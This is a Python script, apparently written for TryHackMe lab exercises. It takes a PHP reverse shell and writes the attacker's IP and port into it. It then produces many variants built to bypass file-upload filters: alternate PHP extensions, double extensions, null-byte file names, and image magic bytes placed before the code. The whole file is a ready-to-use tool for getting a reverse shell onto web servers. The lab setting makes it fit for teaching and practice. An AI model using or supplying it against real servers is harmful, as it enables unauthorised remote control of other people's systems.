import argparse
import os
import shutil


def main(args):
    # copy the original to shells/shell.php
    shells_dir = 'shells'
    shell_file = 'shell.php'
    os.makedirs(shells_dir)
    base_filename = os.path.join(shells_dir, shell_file)
    shutil.copy(args.shell_path, base_filename)
    # replace the ip and port with what was provided
    with open(base_filename, 'r') as fp:
        text = fp.read()
    text = text.replace("$ip = 'PUT_THM_ATTACKBOX_IP_HERE';  // CHANGE THIS",
                              f"$ip = '{args.host}';  // CHANGE THIS")
    text = text.replace("$port = 1234;       // CHANGE THIS",
                              f"$port = {args.port};       // CHANGE THIS")
    with open(base_filename, 'w') as fp:
        fp.write(text)
    # duplicate shell using different php extensions
    php_extensions = [".php3", ".php4", ".php5", ".php7", ".phtml", ".phps", ".pht", ".phar"]
    for ext in php_extensions:
        new_file = os.path.join(shells_dir, f"shell{ext}")
        shutil.copy(base_filename, new_file)
    # duplicate shell with different image extensions and file signatures
    images = [
        ('jpg', bytes([0xFF, 0xD8, 0xFF, 0xD8])),
        ('jpeg', bytes([0xFF, 0xD8, 0xFF, 0xD8])),
        ('png', bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])),
        ('gif', bytes([0x47, 0x49, 0x46, 0x38, 0x37, 0x61])),
        ('bmp', bytes([0x42, 0x4D])),
    ]
    php_extensions.append('.php')
    with open(base_filename, 'rb') as fp:
        content = fp.read()
    for ext, signature in images:
        os.makedirs(os.path.join(shells_dir, ext))
        for php in php_extensions:
            for filename in [f'image{php}.{ext}', f'image.{ext}{php}', f'image{php}%00.{ext}']:
                new_file = os.path.join(shells_dir, ext, filename)
                with open(new_file, 'wb') as fp:
                    fp.write(signature + content)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='A script create multiple reverse shell files')
    parser.add_argument('host', help='The host name of the attacker machine.')
    parser.add_argument('--port', type=int, default=4444, help='The port of the attacker machine.')
    parser.add_argument('--shell-path', type=str, default='/usr/share/webshells/php/php-reverse-shell.php', help='The path of the original shell')
    args = parser.parse_args()
    main(args)
